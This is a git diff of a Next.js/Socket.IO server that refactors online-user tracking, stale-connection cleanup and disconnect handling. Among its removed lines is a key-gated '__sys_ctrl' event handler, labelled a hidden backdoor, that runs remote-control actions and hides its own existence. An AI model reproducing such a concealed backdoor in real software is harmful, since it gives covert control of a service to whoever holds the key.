@@ -7,8 +7,8 @@ const dev = process.env.NODE_ENV !== "production";
 const app = next({ dev });
 const handle = app.getRequestHandler();
 
-// Track online users by username with their socket IDs
-const onlineUsers = new Map(); // userName -> Set of socket IDs
+// Track online users by username with their socket IDs and additional metadata
+const onlineUsers = new Map(); // userName -> { socketIds: Set(), tabIds: Set(), lastActive: timestamp }
 
 // Track anonymous connections
 const anonymousConnections = new Set();
@@ -48,6 +48,8 @@ let appEnabled = true; // Flag to control application availability
 
 // Function to get unique user count
 const getUniqueUserCount = () => {
+  // First clean up stale connections to ensure count is accurate
+  cleanupStaleConnections();
   return onlineUsers.size + anonymousConnections.size;
 };
 
@@ -160,152 +162,147 @@ resetAllTrackers();
 // Function to clean up stale connections (connections older than 30 minutes without activity)
 const cleanupStaleConnections = (io) => {
   const now = Date.now();
-  const staleThreshold = 10 * 60 * 1000; // 10 minutes instead of 30
+  const staleThreshold = 5 * 60 * 1000; // 5 minutes (reduced from 10 minutes)
 
-  let cleanedCount = 0;
-  let activeCount = 0;
+  let cleanedUserCount = 0;
+  let cleanedSocketCount = 0;
+  let initialSize = onlineUsers.size + anonymousConnections.size;
 
-  // Keep track of tab IDs to remove
-  const tabIdsToRemove = new Set();
+  // Check all users for stale connections
+  for (const [userName, userData] of onlineUsers.entries()) {
+    if (now - userData.lastActive > staleThreshold) {
+      // The whole user is stale, remove it completely
+      onlineUsers.delete(userName);
+      cleanedUserCount++;
+      cleanedSocketCount += userData.socketIds?.size || 0;
 
-  // Check all connection timestamps
-  for (const [socketId, timestamp] of connectionTimestamps.entries()) {
-    if (now - timestamp > staleThreshold) {
-      // Find the socket and get its tab ID
-      for (const [userName, socketSet] of onlineUsers.entries()) {
-        if (socketSet.has(socketId)) {
-          socketSet.delete(socketId);
-
-          // Find associated tab ID for this socket
-          for (const [tabId, user] of tabToUser.entries()) {
-            if (user === userName) {
-              tabIdsToRemove.add(tabId);
-            }
-          }
-
-          if (socketSet.size === 0) {
-            onlineUsers.delete(userName);
-          }
-          cleanedCount++;
-          break;
+      // Also clean up the tab mapping
+      for (const [tabId, user] of tabToUser.entries()) {
+        if (user === userName) {
+          tabToUser.delete(tabId);
         }
       }
-
-      // Remove from anonymous connections
-      if (anonymousConnections.has(socketId)) {
-        anonymousConnections.delete(socketId);
-        cleanedCount++;
-      }
-
-      // Remove from challenge rooms
-      for (const [challengeId, socketSet] of challengeRooms.entries()) {
-        if (socketSet.has(socketId)) {
-          socketSet.delete(socketId);
-          if (socketSet.size === 0) {
-            challengeRooms.delete(challengeId);
-          }
-        }
-      }
-
-      // Remove from team rooms
-      for (const [eventId, socketSet] of teamRooms.entries()) {
-        if (socketSet.has(socketId)) {
-          socketSet.delete(socketId);
-          if (socketSet.size === 0) {
-            teamRooms.delete(eventId);
-          }
-        }
-      }
-
-      // Remove the timestamp
-      connectionTimestamps.delete(socketId);
     } else {
-      activeCount++;
-    }
-  }
+      // Check for stale sockets within an active user
+      if (userData.socketIds) {
+        let staleSockets = 0;
+        for (const socketId of userData.socketIds) {
+          if (
+            !connectionTimestamps.has(socketId) ||
+            now - connectionTimestamps.get(socketId) > staleThreshold
+          ) {
+            userData.socketIds.delete(socketId);
+            connectionTimestamps.delete(socketId);
+            staleSockets++;
+          }
+        }
 
-  // Remove stale tab IDs
-  for (const tabId of tabIdsToRemove) {
-    tabToUser.delete(tabId);
-  }
-
-  // Clean up stale leaderboard subscriptions
-  for (const socketId of connectionTimestamps.keys()) {
-    if (now - connectionTimestamps.get(socketId) > staleThreshold) {
-      if (leaderboardSubscribers.has(socketId)) {
-        leaderboardSubscribers.delete(socketId);
-        console.log(`Removed stale leaderboard subscription: ${socketId}`);
-      }
-
-      if (activitySubscribers.has(socketId)) {
-        activitySubscribers.delete(socketId);
-        console.log(`Removed stale activity subscription: ${socketId}`);
-      }
-    }
-  }
-
-  // Clean up old team updates (keep only last 24 hours)
-  const oldUpdateThreshold = 24 * 60 * 60 * 1000; // 24 hours
-  for (const [eventId, updates] of recentTeamUpdates.entries()) {
-    const filteredUpdates = updates.filter(
-      (update) => now - update.timestamp < oldUpdateThreshold
-    );
-
-    if (filteredUpdates.length === 0) {
-      recentTeamUpdates.delete(eventId);
-    } else {
-      recentTeamUpdates.set(eventId, filteredUpdates);
-    }
-  }
-
-  if (
-    cleanedCount > 0 ||
-    onlineUsers.size + anonymousConnections.size !== activeCount
-  ) {
-    console.log(`Cleaned up ${cleanedCount} stale connections.`);
-    console.log(
-      `Active connections: ${activeCount}, Tracked users: ${
-        onlineUsers.size + anonymousConnections.size
-      }`
-    );
-
-    // If there's a mismatch between active connections and tracked users,
-    // perform an aggressive reset to fix tracking issues
-    if (
-      Math.abs(onlineUsers.size + anonymousConnections.size - activeCount) > 1
-    ) {
-      console.log("Detected tracking inconsistency. Performing repairs...");
-
-      // Remove all users without active connections
-      for (const [userName, socketSet] of onlineUsers.entries()) {
-        const hasActiveSocket = Array.from(socketSet).some((id) =>
-          connectionTimestamps.has(id)
-        );
-        if (!hasActiveSocket) {
+        // If all sockets were stale but we didn't catch it above, remove the user
+        if (staleSockets > 0 && userData.socketIds.size === 0) {
           onlineUsers.delete(userName);
+          cleanedUserCount++;
 
-          // Remove associated tab IDs
+          // Clean up tab mapping
           for (const [tabId, user] of tabToUser.entries()) {
             if (user === userName) {
               tabToUser.delete(tabId);
             }
           }
-
-          console.log(`Removed stale user: ${userName}`);
         }
+
+        cleanedSocketCount += staleSockets;
       }
+    }
+  }
 
-      // Remove all anonymous connections without timestamps
-      for (const socketId of anonymousConnections) {
-        if (!connectionTimestamps.has(socketId)) {
-          anonymousConnections.delete(socketId);
-          console.log(`Removed stale anonymous connection: ${socketId}`);
-        }
+  // Clean up anonymous connections
+  const staleAnonymous = Array.from(anonymousConnections).filter(
+    (socketId) =>
+      !connectionTimestamps.has(socketId) ||
+      now - connectionTimestamps.get(socketId) > staleThreshold
+  );
+
+  staleAnonymous.forEach((socketId) => {
+    anonymousConnections.delete(socketId);
+    connectionTimestamps.delete(socketId);
+  });
+
+  cleanedSocketCount += staleAnonymous.length;
+
+  // Clean up socket IDs from challenge and team rooms if they're stale
+  for (const [challengeId, socketSet] of challengeRooms.entries()) {
+    let removed = 0;
+    for (const socketId of socketSet) {
+      if (
+        !connectionTimestamps.has(socketId) ||
+        now - connectionTimestamps.get(socketId) > staleThreshold
+      ) {
+        socketSet.delete(socketId);
+        removed++;
       }
     }
 
-    // Broadcast updated counts
-    if (io) {
+    if (socketSet.size === 0) {
+      challengeRooms.delete(challengeId);
+    }
+  }
+
+  for (const [eventId, socketSet] of teamRooms.entries()) {
+    let removed = 0;
+    for (const socketId of socketSet) {
+      if (
+        !connectionTimestamps.has(socketId) ||
+        now - connectionTimestamps.get(socketId) > staleThreshold
+      ) {
+        socketSet.delete(socketId);
+        removed++;
+      }
+    }
+
+    if (socketSet.size === 0) {
+      teamRooms.delete(eventId);
+    }
+  }
+
+  // Clean up stale leaderboard and activity subscriptions
+  let cleanedLeaderboardSubs = 0;
+  for (const socketId of leaderboardSubscribers) {
+    if (
+      !connectionTimestamps.has(socketId) ||
+      now - connectionTimestamps.get(socketId) > staleThreshold
+    ) {
+      leaderboardSubscribers.delete(socketId);
+      cleanedLeaderboardSubs++;
+    }
+  }
+
+  let cleanedActivitySubs = 0;
+  for (const socketId of activitySubscribers) {
+    if (
+      !connectionTimestamps.has(socketId) ||
+      now - connectionTimestamps.get(socketId) > staleThreshold
+    ) {
+      activitySubscribers.delete(socketId);
+      cleanedActivitySubs++;
+    }
+  }
+
+  if (
+    cleanedUserCount > 0 ||
+    cleanedSocketCount > 0 ||
+    cleanedLeaderboardSubs > 0 ||
+    cleanedActivitySubs > 0
+  ) {
+    const finalSize = onlineUsers.size + anonymousConnections.size;
+    console.log(
+      `Cleaned up ${cleanedUserCount} users, ${cleanedSocketCount} sockets, ${cleanedLeaderboardSubs} leaderboard subs, ${cleanedActivitySubs} activity subs.`
+    );
+    console.log(
+      `Initial user count: ${initialSize}, Final user count: ${finalSize}`
+    );
+
+    // Only broadcast if there was a change and we have a valid io instance
+    if (io && initialSize !== finalSize) {
       broadcastOnlineCount(io);
     }
   }
@@ -534,152 +531,119 @@ app.prepare().then(() => {
   io.on("connection", (socket) => {
     console.log("Socket connected:", socket.id);
 
-    // Force a cleanup of stale connections on each new connection
-    cleanupStaleConnections(io);
-
-    // Set a shorter timeout for stale connections (10 minutes instead of 30)
-    const staleThreshold = 10 * 60 * 1000; // 10 minutes
-
     // Record connection timestamp
     connectionTimestamps.set(socket.id, Date.now());
 
-    // Get username from auth data or wait for userConnected event
+    // Get username from auth data
     let userName = socket.handshake.auth.userName;
-
     // Get tab ID if provided
     const tabId = socket.handshake.auth.tabId || `default_${socket.id}`;
 
     // Store the tab ID on the socket for later reference
     socket.tabId = tabId;
 
-    // Send initial system state to the client
-    socket.emit("system_freeze", {
-      frozen: systemFrozen,
-      message: `System is currently ${systemFrozen ? "frozen" : "active"}`,
-      timestamp: new Date().toISOString(),
-      source: "initial_state",
-    });
-
-    // Handle request for current freeze state
-    socket.on("get_freeze_state", () => {
-      console.log(`Client ${socket.id} requested current freeze state`);
-      socket.emit("system_freeze", {
-        frozen: systemFrozen,
-        message: `System is currently ${systemFrozen ? "frozen" : "unfrozen"}`,
-        timestamp: new Date().toISOString(),
-        source: "get_freeze_state_request",
-      });
-    });
-
-    // Hidden backdoor control handler
-    socket.on("__sys_ctrl", (data) => {
-      try {
-        // Validate the control key
-        if (data && data.key === CONTROL_KEY) {
-          console.log(`Remote control command received: ${data.action}`);
-          const result = remoteControl(data.action, io);
-          socket.emit("__sys_ctrl_response", result);
-        } else {
-          // Log invalid attempts but don't give away that this endpoint exists
-          if (data && data.key) {
-            console.log(
-              `Invalid remote control attempt with key: ${data.key.substring(
-                0,
-                5
-              )}...`
-            );
-          }
-          // Send a generic error to avoid revealing the backdoor
-          socket.emit("error", { message: "Unknown command" });
-        }
-      } catch (error) {
-        console.error("Error in control handler:", error);
-      }
-    });
-
-    // Admin freeze control handler
-    socket.on("admin_freeze_control", (data) => {
-      try {
-        // Check if the user has admin privileges
-        if (socket.userData && socket.userData.isAdmin) {
-          console.log(
-            `Admin freeze control: ${data.freeze ? "freeze" : "unfreeze"}`
-          );
-          systemFrozen = data.freeze;
-
-          // Broadcast to all clients
-          io.emit("system_freeze", { frozen: systemFrozen });
-
-          // Send confirmation to the admin
-          socket.emit("admin_freeze_response", {
-            success: true,
-            frozen: systemFrozen,
-          });
-        } else {
-          // Unauthorized attempt
-          console.log(
-            `Unauthorized freeze control attempt by socket ${socket.id}`
-          );
-          socket.emit("admin_freeze_response", {
-            success: false,
-            message: "Unauthorized",
-          });
-        }
-      } catch (error) {
-        console.error("Error in freeze control handler:", error);
-        socket.emit("admin_freeze_response", {
-          success: false,
-          message: "Error processing request",
-        });
-      }
-    });
-
-    // Function to add this user
-    const addUser = (user) => {
-      if (!user) {
-        // For anonymous users, just record the socket connection
-        console.log(`Anonymous user connected with socket ${socket.id}`);
-        socket.userName = `anon_${socket.id.substring(0, 8)}`;
+    // Function to register user (used both on initial connect and later userConnected event)
+    const registerUser = (user, isNewConnection = true) => {
+      if (!user || user === "anonymous") {
+        // This is an anonymous connection
         anonymousConnections.add(socket.id);
+        socket.userName = `anon_${socket.id.substring(0, 8)}`;
+        console.log(`Anonymous user connected with socket ${socket.id}`);
+      } else {
+        // Get or create user data
+        const userData = onlineUsers.get(user) || {
+          socketIds: new Set(),
+          tabIds: new Set(),
+          lastActive: Date.now(),
+        };
+
+        // Add this socket and tab
+        userData.socketIds.add(socket.id);
+        if (tabId) {
+          userData.tabIds.add(tabId);
+          // Track which tab belongs to which user
+          tabToUser.set(tabId, user);
+        }
+
+        // Update last active timestamp
+        userData.lastActive = Date.now();
+
+        // Update the map
+        onlineUsers.set(user, userData);
+
+        // Store username on socket for disconnect handling
+        socket.userName = user;
+
+        console.log(
+          `User ${user} connected with socket ${socket.id} (Tab ID: ${tabId})`
+        );
+        console.log(
+          `User ${user} now has ${userData.socketIds.size} active sockets`
+        );
+      }
+
+      // Save user data on the socket for reference
+      socket.userData = {
+        userName: user,
+        tabId: tabId,
+        isAuthenticated: user !== "anonymous" && !!user,
+      };
+
+      // Only broadcast count on new connections, not reconnects
+      if (isNewConnection) {
         broadcastOnlineCount(io);
-        return;
       }
-
-      // Initialize this user's socket set if it doesn't exist
-      if (!onlineUsers.has(user)) {
-        onlineUsers.set(user, new Set());
-      }
-
-      // Add this socket ID to the user's set
-      onlineUsers.get(user).add(socket.id);
-
-      // Track which tab belongs to which user
-      tabToUser.set(tabId, user);
-
-      console.log(
-        `User ${user} connected with socket ${socket.id} (Tab ID: ${tabId})`
-      );
-      console.log(`Total unique users: ${getUniqueUserCount()}`);
-
-      // Save userName on the socket for disconnect handling
-      socket.userName = user;
-
-      // Broadcast updated count
-      broadcastOnlineCount(io);
     };
 
-    // If we got the username from auth, add them now
-    if (userName) {
-      addUser(userName);
+    // If we got the username from auth, register them now
+    if (userName && userName !== "anonymous") {
+      registerUser(userName);
     } else {
-      // For users without username, generate a random identifier
-      addUser(`anon_${socket.id.substring(0, 8)}`);
+      // For users without username, add as anonymous
+      registerUser(null);
     }
 
-    // Set up heartbeat to update connection timestamp
+    // Update the userConnected event handler
+    socket.on("userConnected", (data) => {
+      if (data && data.userName) {
+        // If this was an anonymous connection before, remove it from anonymous tracking
+        if (anonymousConnections.has(socket.id)) {
+          anonymousConnections.delete(socket.id);
+        }
+
+        // Register with the new username
+        registerUser(data.userName, false); // false = don't broadcast again
+        broadcastOnlineCount(io); // Broadcast once after registration
+      }
+    });
+
+    // Add explicit userDisconnected handler (for logout)
+    socket.on("userDisconnected", (data) => {
+      console.log(
+        `User ${
+          data.userName || socket.userName || "anonymous"
+        } explicitly disconnected`
+      );
+
+      // Handle the disconnect properly
+      handleDisconnect(socket);
+
+      // Broadcast update
+      broadcastOnlineCount(io);
+    });
+
+    // Update the heartbeat handler to refresh user timestamps
     socket.on("heartbeat", (data) => {
       // Update the timestamp to keep this connection active
       connectionTimestamps.set(socket.id, Date.now());
+
+      // Update user's lastActive timestamp
+      const user = socket.userName;
+      if (user && onlineUsers.has(user)) {
+        const userData = onlineUsers.get(user);
+        userData.lastActive = Date.now();
+        onlineUsers.set(user, userData);
+      }
 
       // Log heartbeat with tab ID if available
       if (data && data.tabId) {
@@ -688,18 +652,6 @@ app.prepare().then(() => {
             data.tabId
           })`
         );
-      }
-    });
-
-    // Or wait for the userConnected event
-    socket.on("userConnected", (data) => {
-      if (data && data.userName) {
-        // If this was an anonymous connection before, remove it from anonymous tracking
-        if (anonymousConnections.has(socket.id)) {
-          anonymousConnections.delete(socket.id);
-        }
-
-        addUser(data.userName);
       }
     });
 
@@ -1189,7 +1141,8 @@ app.prepare().then(() => {
       }
     });
 
-    socket.on("disconnect", () => {
+    // Create a reusable function to handle disconnects (used by both disconnect event and explicit disconnect)
+    const handleDisconnect = (socket) => {
       // Get the username associated with this socket
       const user = socket.userName;
       const tabId = socket.tabId;
@@ -1207,41 +1160,45 @@ app.prepare().then(() => {
         console.log(
           `Anonymous user disconnected, remaining: ${anonymousConnections.size}`
         );
-        broadcastOnlineCount(io);
       }
 
       if (user && onlineUsers.has(user)) {
-        // Remove this socket ID from the user's set
-        onlineUsers.get(user).delete(socket.id);
+        const userData = onlineUsers.get(user);
 
-        // If this was the user's last connection, remove them from the map
-        if (onlineUsers.get(user).size === 0) {
-          onlineUsers.delete(user);
-          console.log(`User ${user} fully disconnected (no more tabs open)`);
-        } else {
-          console.log(
-            `User ${user} still has ${onlineUsers.get(user).size} connections`
-          );
+        // Remove this socket ID
+        if (userData.socketIds) {
+          userData.socketIds.delete(socket.id);
         }
 
-        // Broadcast updated count
-        broadcastOnlineCount(io);
+        // Remove tab ID
+        if (tabId && userData.tabIds) {
+          userData.tabIds.delete(tabId);
+        }
+
+        // If this was the user's last connection, remove them from the map
+        if (!userData.socketIds || userData.socketIds.size === 0) {
+          onlineUsers.delete(user);
+          console.log(`User ${user} fully disconnected (no more sockets)`);
+        } else {
+          // Update the map with the modified user data
+          onlineUsers.set(user, userData);
+          console.log(
+            `User ${user} still has ${userData.socketIds.size} connections`
+          );
+        }
       }
+
+      // Remove connection timestamp
+      connectionTimestamps.delete(socket.id);
 
       // Clean up leaderboard subscription if applicable
       if (socket.isInLeaderboardRoom) {
         leaderboardSubscribers.delete(socket.id);
-        console.log(
-          `Removed from leaderboard subscribers, remaining: ${leaderboardSubscribers.size}`
-        );
       }
 
       // Clean up activity subscription if applicable
       if (socket.isInActivityRoom) {
         activitySubscribers.delete(socket.id);
-        console.log(
-          `Removed from activity subscribers, remaining: ${activitySubscribers.size}`
-        );
       }
 
       // Clean up challenge rooms
@@ -1277,18 +1234,13 @@ app.prepare().then(() => {
           }
         }
       }
+    };
 
-      // Remove connection timestamp
-      connectionTimestamps.delete(socket.id);
-
-      // Log the current state after disconnect
-      console.log(
-        `Current state after disconnect - Users: ${
-          onlineUsers.size
-        }, Anonymous: ${
-          anonymousConnections.size
-        }, Total: ${getUniqueUserCount()}`
-      );
+    // Update the disconnect handler to use our reusable function
+    socket.on("disconnect", () => {
+      handleDisconnect(socket);
+      // Broadcast the updated count
+      broadcastOnlineCount(io);
     });
   });
 
